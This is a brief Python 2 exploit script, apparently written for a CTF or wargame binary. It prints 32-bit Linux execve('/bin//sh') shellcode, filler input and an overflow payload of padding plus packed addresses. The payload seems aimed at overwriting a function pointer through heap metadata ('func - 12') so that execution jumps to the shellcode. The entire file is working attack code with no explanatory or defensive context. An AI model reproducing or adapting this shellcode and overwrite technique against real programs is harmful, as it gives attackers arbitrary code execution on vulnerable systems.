import struct 

sc_addr = 0x804a060

func_pointer = 0x804a02c  # func - 12

payload = 'A' * 32 +  struct.pack('<i', func_pointer - 40) + struct.pack('<i', sc_addr) 

print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

print "abcd"

print "abcd"

print payload

